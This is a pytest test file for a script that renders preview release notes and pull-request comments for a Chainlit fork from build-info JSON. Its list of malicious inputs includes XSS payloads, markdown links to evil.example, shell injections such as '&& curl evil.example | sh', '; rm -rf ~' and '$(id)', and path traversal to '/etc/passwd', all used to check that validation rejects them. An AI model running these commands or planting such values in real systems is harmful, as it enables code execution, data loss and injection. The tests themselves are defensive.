"""Tests for scripts/release_notes.py (preview release notes / PR comment)."""

import copy
import importlib.util
import json
import sys
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "release_notes.py"
_spec = importlib.util.spec_from_file_location("release_notes", _SCRIPT)
assert _spec
assert _spec.loader
rn = importlib.util.module_from_spec(_spec)
# dataclasses resolves string annotations through sys.modules.
sys.modules[_spec.name] = rn
_spec.loader.exec_module(rn)

REPO = "chainlit-community/chainlit"
SHA = "0123456789abcdef0123456789abcdef01234567"
HEAD_SHA = "fedcba9876543210fedcba9876543210fedcba98"

MAIN_INFO = {
    "version": "3.0.0.dev1234",
    "client_version": "0.5.0-dev.1234",
    "base_version": "3.0.0",
    "build_number": 1234,
    "sha": SHA,
    "ref": "refs/heads/main",
    "event": "push",
    "pr_number": None,
    "run_id": "123456789",
    "files": {
        "wheel": "chainlit-3.0.0.dev1234-py3-none-any.whl",
        "sdist": "chainlit-3.0.0.dev1234.tar.gz",
        "react_client": "chainlit-react-client-0.5.0-dev.1234.tgz",
    },
}

PR_INFO = {
    "version": "3.0.0.dev1235+pr77.g0123456",
    "client_version": "0.5.0-dev.1235",
    "base_version": "3.0.0",
    "build_number": 1235,
    "sha": SHA,
    "ref": "refs/pull/77/merge",
    "event": "pull_request",
    "pr_number": 77,
    "run_id": "987654321",
    "files": {
        "wheel": "chainlit-3.0.0.dev1235+pr77.g0123456-py3-none-any.whl",
        "sdist": "chainlit-3.0.0.dev1235+pr77.g0123456.tar.gz",
        "react_client": "chainlit-react-client-0.5.0-dev.1235.tgz",
    },
}

RELEASE_BASE = f"https://github.com/{REPO}/releases/download/3.0.0.dev1234"
WHEEL_URL = f"{RELEASE_BASE}/chainlit-3.0.0.dev1234-py3-none-any.whl"
CLIENT_URL = f"{RELEASE_BASE}/chainlit-react-client-0.5.0-dev.1234.tgz"
PR_WHEEL = "./chainlit-dist/chainlit-3.0.0.dev1235+pr77.g0123456-py3-none-any.whl"
PR_CLIENT = "./chainlit-dist/chainlit-react-client-0.5.0-dev.1235.tgz"

EVIL = "<img src=x onerror=alert(1)>"


def _with(base: dict, **changes) -> dict:
    data = copy.deepcopy(base)
    for key, value in changes.items():
        if key.startswith("files_"):
            data["files"][key.removeprefix("files_")] = value
        else:
            data[key] = value
    return data


def _write(tmp_path: Path, data) -> Path:
    path = tmp_path / "build-info.json"
    path.write_text(data if isinstance(data, str) else json.dumps(data))
    return path


def _run(capsys, *argv: str) -> tuple[int, str, str]:
    code = rn.main(list(argv))
    captured = capsys.readouterr()
    return code, captured.out, captured.err


class TestRelease:
    @pytest.fixture
    def body(self) -> str:
        return rn.render_release(rn.parse_build_info(MAIN_INFO), REPO)

    def test_install_commands_use_release_asset_urls(self, body: str):
        for line in (
            f"pip install {WHEEL_URL}",
            f'uv add "chainlit @ {WHEEL_URL}"',
            f"uv pip install {WHEEL_URL}",
            f"poetry add {WHEEL_URL}",
            f"npm install --allow-remote=root {CLIENT_URL}",
            f"pnpm add {CLIENT_URL}",
        ):
            assert line in body.splitlines()

    def test_commands_are_labelled_as_alternatives(self, body: str):
        lines = body.splitlines()
        assert "use the **one** command that matches your tooling" in body
        project = lines.index(
            "# uv, in a project: records the dependency in pyproject.toml"
        )
        assert lines[project + 1] == f'uv add "chainlit @ {WHEEL_URL}"'
        venv = lines.index(
            "# uv, without a project: installs into the active virtual environment only"
        )
        assert lines[venv + 1] == f"uv pip install {WHEEL_URL}"

    def test_npm_12_remote_tarball_note(self, body: str):
        assert "npm 12 and later refuse tarball URLs outside the registry" in body
        assert "`allow-remote=root` in your project's `.npmrc`" in body
        # pnpm has no such restriction.
        assert not any(
            "allow-remote" in line
            for line in body.splitlines()
            if line.startswith("pnpm")
        )

    def test_preview_notice(self, body: str):
        assert "automated preview build" in body
        assert "not an official release" in body
        assert f"[`0123456`](https://github.com/{REPO}/commit/{SHA})" in body
        assert "`pip install chainlit` installs the **unmaintained upstream" in body
        assert "Node.js and pnpm are **not** needed" in body

    def test_verification(self, body: str):
        assert "sha256sum --ignore-missing -c SHA256SUMS" in body
        assert (
            f"gh attestation verify chainlit-3.0.0.dev1234-py3-none-any.whl -R {REPO}"
            in body
        )

    def test_no_pr_marker_and_no_generated_changelog(self, body: str):
        assert rn.MARKER not in body
        assert "What's Changed" not in body

    def test_asset_urls_are_percent_encoded(self):
        url = rn.release_asset_url(REPO, "1.0.0.dev1+pr2.gabcdef0", "a+b c.whl")
        assert url == (
            f"https://github.com/{REPO}/releases/download/"
            "1.0.0.dev1%2Bpr2.gabcdef0/a%2Bb%20c.whl"
        )

    def test_rejects_pr_build(self):
        with pytest.raises(rn.ValidationError):
            rn.render_release(rn.parse_build_info(PR_INFO), REPO)

    def test_cli(self, tmp_path, capsys):
        code, out, err = _run(
            capsys,
            "release",
            str(_write(tmp_path, MAIN_INFO)),
            "--repo",
            REPO,
            "--expect-sha",
            SHA,
            "--expect-run-id",
            "123456789",
        )
        assert (code, err) == (0, "")
        assert out == rn.render_release(rn.parse_build_info(MAIN_INFO), REPO)


class TestPrComment:
    def _body(self, conclusion: str = "success", **kwargs) -> str:
        return rn.render_pr_comment(
            rn.parse_build_info(PR_INFO), REPO, conclusion, **kwargs
        )

    def test_first_line_is_hidden_marker(self):
        assert self._body().splitlines()[0] == "<!-- chainlit-build-artifact -->"

    def test_summary(self):
        body = self._body()
        run_url = f"https://github.com/{REPO}/actions/runs/987654321"
        assert "`3.0.0.dev1235+pr77.g0123456`" in body
        assert f"[`0123456`](https://github.com/{REPO}/commit/{SHA})" in body
        assert f"({run_url}#artifacts)" in body
        assert "| CI       | passed |" in body
        assert "direct download" not in body
        assert "[!WARNING]" not in body
        assert "signed in to GitHub" in body
        assert "**expire**" in body

    def test_install_commands_use_local_paths(self):
        lines = self._body().splitlines()
        for line in (
            f"gh run download 987654321 -R {REPO} -n dist -D chainlit-dist",
            f"pip install {PR_WHEEL}",
            f"uv pip install {PR_WHEEL}",
            f"uv add {PR_WHEEL}",
            f"poetry add {PR_WHEEL}",
            # Local tarballs are governed by npm's `allow-file` (default
            # `all`), so no --allow-remote here.
            f"npm install {PR_CLIENT}",
            f"pnpm add {PR_CLIENT}",
        ):
            assert line in lines
        assert "allow-remote" not in self._body()
        assert "releases/download" not in self._body()

    def test_commands_are_labelled_as_alternatives(self):
        body = self._body()
        lines = body.splitlines()
        assert "use the **one** command that matches your tooling" in body
        project = lines.index(
            "# uv, in a project: records the dependency in pyproject.toml"
        )
        assert lines[project + 1] == f"uv add {PR_WHEEL}"
        venv = lines.index(
            "# uv, without a project: installs into the active virtual environment only"
        )
        assert lines[venv + 1] == f"uv pip install {PR_WHEEL}"

    def test_artifact_url_and_trusted_head_sha(self):
        artifact = f"https://github.com/{REPO}/actions/runs/987654321/artifacts/42"
        body = self._body(artifact_url=artifact, head_sha=HEAD_SHA)
        assert f"([direct download]({artifact}))" in body
        assert f"[`fedcba9`](https://github.com/{REPO}/commit/{HEAD_SHA})" in body
        assert SHA not in body

    @pytest.mark.parametrize("conclusion", ["failure", "cancelled", "timed_out"])
    def test_unsuccessful_ci_is_flagged(self, conclusion: str):
        body = self._body(conclusion)
        assert "[!WARNING]" in body
        assert "checks did **not** all pass" in body
        assert f"(conclusion: `{conclusion}`)" in body
        assert "| CI       | passed |" not in body

    @pytest.mark.parametrize(
        "kwargs",
        [
            {"conclusion": EVIL},
            {"artifact_url": "https://evil.example/actions/runs/987654321/artifacts/1"},
            {"artifact_url": f"https://github.com/{REPO}/actions/runs/1/artifacts/1"},
            {
                "artifact_url": f"https://github.com/{REPO}/actions/runs/987654321"
                "/artifacts/1) [x](https://evil.example"
            },
            {"head_sha": "0123456"},
            {"head_sha": SHA.upper()},
        ],
    )
    def test_rejects_bad_arguments(self, kwargs: dict):
        with pytest.raises(rn.ValidationError):
            self._body(**{"conclusion": "success", **kwargs})

    def test_rejects_main_build(self):
        with pytest.raises(rn.ValidationError):
            rn.render_pr_comment(rn.parse_build_info(MAIN_INFO), REPO, "success")

    def test_cli(self, tmp_path, capsys):
        code, out, err = _run(
            capsys,
            "pr-comment",
            str(_write(tmp_path, PR_INFO)),
            "--repo",
            REPO,
            "--conclusion",
            "failure",
            "--expect-pr",
            "77",
            "--expect-run-id",
            "987654321",
        )
        assert (code, err) == (0, "")
        assert out == self._body("failure")


@pytest.mark.parametrize("repo", ["chainlit", "a/b/c", "a/..", "a/b c", "a/b\n", EVIL])
def test_rejects_bad_repo(repo: str):
    with pytest.raises(rn.ValidationError):
        rn.render_release(rn.parse_build_info(MAIN_INFO), repo)


def test_accepts_client_tarball_without_build_metadata():
    data = _with(
        PR_INFO,
        client_version="0.5.0-dev.1235+pr77.g0123456",
        files_react_client="chainlit-react-client-0.5.0-dev.1235.tgz",
    )
    assert rn.parse_build_info(data).react_client.endswith("-dev.1235.tgz")
    data["files"]["react_client"] = (
        "chainlit-react-client-0.5.0-dev.1235+pr77.g0123456.tgz"
    )
    assert rn.parse_build_info(data).client_version.endswith("+pr77.g0123456")


MALICIOUS = [
    # --- Markdown / HTML injection through the version ---
    _with(MAIN_INFO, version=f"3.0.0.dev1234{EVIL}"),
    _with(MAIN_INFO, version="3.0.0.dev1234`\n\n# pwned\n[x](https://evil.example)"),
    _with(MAIN_INFO, version="3.0.0.dev1234\n"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.g0123456](https://evil.example)"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.gXYZ<b>!"),
    _with(MAIN_INFO, base_version="3.0.0<script>", version="3.0.0<script>.dev1234"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234 && curl evil.example | sh"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234<!--"),
    _with(MAIN_INFO, client_version="0.5.0"),
    # --- version inconsistent with its parts / wrong shape for the event ---
    _with(MAIN_INFO, version="3.0.1.dev1234"),
    _with(MAIN_INFO, version="3.0.0.dev1235"),
    _with(MAIN_INFO, version="3.0.0"),
    _with(MAIN_INFO, version="3.0.0.dev1234+pr77.g0123456"),
    _with(MAIN_INFO, client_version="0.5.0-dev.1234+pr1"),
    _with(MAIN_INFO, event="pull_request"),
    _with(MAIN_INFO, ref="refs/heads/dev"),
    _with(PR_INFO, version="3.0.0.dev1235"),
    _with(PR_INFO, pr_number=78),
    _with(PR_INFO, sha=HEAD_SHA),
    _with(PR_INFO, event="push"),
    _with(PR_INFO, version="3.0.0.dev1235+pr77.g0123456.extra"),
    # --- wrong types ---
    _with(MAIN_INFO, build_number="1234"),
    _with(MAIN_INFO, build_number=True),
    _with(MAIN_INFO, build_number=-1),
    _with(PR_INFO, pr_number="77"),
    _with(PR_INFO, pr_number=77.0),
    _with(PR_INFO, pr_number=True),
    _with(MAIN_INFO, run_id=123456789),
    _with(MAIN_INFO, version=["3.0.0.dev1234"]),
    _with(MAIN_INFO, files=[]),
    # --- sha / run id ---
    _with(MAIN_INFO, sha="0123456"),
    _with(MAIN_INFO, sha=SHA.upper()),
    _with(MAIN_INFO, sha=SHA[:-1] + "g"),
    _with(MAIN_INFO, sha=SHA + "\n"),
    _with(MAIN_INFO, run_id="12345/../../evil"),
    _with(MAIN_INFO, run_id="1 -R evil/repo"),
    _with(MAIN_INFO, run_id=""),
    # --- file names: traversal, separators, injection, mismatches ---
    _with(MAIN_INFO, files_wheel="../chainlit-3.0.0.dev1234-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel="/etc/passwd"),
    _with(MAIN_INFO, files_wheel="x/chainlit-3.0.0.dev1234-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel="..\\chainlit-3.0.0.dev1234-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel="chainlit-9.9.9-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel="evil-3.0.0.dev1234-py3-none-any.whl"),
    _with(MAIN_INFO, files_wheel=f"chainlit-3.0.0.dev1234-py3-none-any.whl{EVIL}"),
    _with(MAIN_INFO, files_wheel="chainlit-3.0.0.dev1234-py3-none-any.whl; rm -rf ~"),
    _with(MAIN_INFO, files_sdist="chainlit-3.0.0.dev1234.tar.gz`$(id)`"),
    _with(MAIN_INFO, files_sdist="chainlit-3.0.0.dev1234.zip"),
    _with(MAIN_INFO, files_react_client="../../chainlit-react-client-0.5.0.tgz"),
    _with(MAIN_INFO, files_react_client="[click](https://evil.example).tgz"),
    _with(MAIN_INFO, files_react_client=None),
    _with(MAIN_INFO, files_extra="evil"),
    {k: v for k, v in MAIN_INFO.items() if k != "files"},
    {k: v for k, v in MAIN_INFO.items() if k != "sha"},
    # --- not an object ---
    [MAIN_INFO],
    "3.0.0.dev1234",
    None,
]


@pytest.mark.parametrize("data", MALICIOUS)
def test_rejects_malicious_build_info(data, tmp_path, capsys):
    with pytest.raises(rn.ValidationError):
        rn.parse_build_info(data)

    # Through the CLI nothing is rendered and no untrusted value is echoed.
    path = _write(tmp_path, data)
    for argv in (
        ["release", str(path), "--repo", REPO],
        ["pr-comment", str(path), "--repo", REPO, "--conclusion", "success"],
        ["validate", str(path)],
    ):
        code, out, err = _run(capsys, *argv)
        assert code == 1
        assert out == ""
        assert err.startswith("error: build-info: ")
        for needle in ("evil", "<", "pwned", "passwd", "rm -rf", "$(", ".."):
            assert needle not in err


@pytest.mark.parametrize(
    "content",
    ["", "{", "﻿{}", '{"version": NaN', "[" * 100_000, " " * 70_000],
)
def test_rejects_unparseable_or_oversized_file(content: str, tmp_path, capsys):
    code, out, err = _run(capsys, "validate", str(_write(tmp_path, content)))
    assert (code, out) == (1, "")
    assert err.startswith("error: build-info: ")


def test_rejects_missing_file(tmp_path, capsys):
    code, out, _ = _run(capsys, "validate", str(tmp_path / "nope.json"))
    assert (code, out) == (1, "")


@pytest.mark.parametrize(
    ("info", "argv"),
    [
        (MAIN_INFO, ["--expect-sha", HEAD_SHA]),
        (MAIN_INFO, ["--expect-run-id", "1"]),
        (MAIN_INFO, ["--expect-pr", "77"]),
        (PR_INFO, ["--expect-pr", "78"]),
        (PR_INFO, ["--expect-run-id", "123456789"]),
        (PR_INFO, ["--kind", "release"]),
        (MAIN_INFO, ["--kind", "pr"]),
    ],
)
def test_mismatched_expectations_fail(info, argv, tmp_path, capsys):
    code, out, err = _run(capsys, "validate", str(_write(tmp_path, info)), *argv)
    assert (code, out) == (1, "")
    assert "does not match" in err or "not a" in err


def test_validate_prints_safe_key_value_lines(tmp_path, capsys):
    code, out, _ = _run(
        capsys,
        "validate",
        str(_write(tmp_path, PR_INFO)),
        "--kind",
        "pr",
        "--expect-pr",
        "77",
    )
    assert code == 0
    fields = dict(line.split("=", 1) for line in out.splitlines())
    assert fields["kind"] == "pr"
    assert fields["version"] == PR_INFO["version"]
    assert fields["pr_number"] == "77"
    assert fields["sha"] == SHA
    assert fields["wheel"] == PR_INFO["files"]["wheel"]

    code, out, _ = _run(capsys, "validate", str(_write(tmp_path, MAIN_INFO)))
    fields = dict(line.split("=", 1) for line in out.splitlines())
    assert (code, fields["kind"], fields["pr_number"]) == (0, "release", "")
